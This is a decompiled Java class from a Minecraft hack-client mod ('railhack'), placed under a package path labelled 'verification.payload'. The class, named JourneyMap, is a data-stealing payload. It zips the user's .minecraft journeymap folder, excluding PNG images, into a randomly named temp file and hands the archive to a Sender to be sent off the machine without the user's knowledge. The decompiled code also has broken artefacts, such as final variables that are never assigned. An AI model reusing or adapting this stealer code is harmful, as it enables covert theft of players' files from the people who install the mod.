//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.nio.file.attribute.*;
import java.util.zip.*;
import java.io.*;
import java.nio.file.*;

public final class JourneyMap implements Payload
{
    @Override
    public void execute() throws Exception {
        final File packed = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
        this.pack(System.getenv("APPDATA") + "\\.minecraft\\journeymap", packed.getPath());
        Sender.send(packed);
    }
    
    private void pack(final String sourceDirPath, final String zipFilePath) throws IOException {
        final Path p = Files.createFile(Paths.get(zipFilePath, new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
        try (final ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p, new OpenOption[0]))) {
            final Path pp = Paths.get(sourceDirPath, new String[0]);
            final Path path2;
            final ZipEntry zipEntry;
            final ZipOutputStream zipOutputStream;
            Files.walk(pp, new FileVisitOption[0]).filter(path -> !Files.isDirectory(path, new LinkOption[0])).filter(path -> !path.toFile().getName().endsWith(".png")).forEach(path -> {
                zipEntry = new ZipEntry(path2.relativize(path).toString());
                try {
                    zipOutputStream.putNextEntry(zipEntry);
                    Files.copy(path, zipOutputStream);
                    zipOutputStream.closeEntry();
                }
                catch (IOException ex) {}
                return;
            });
        }
    }
}
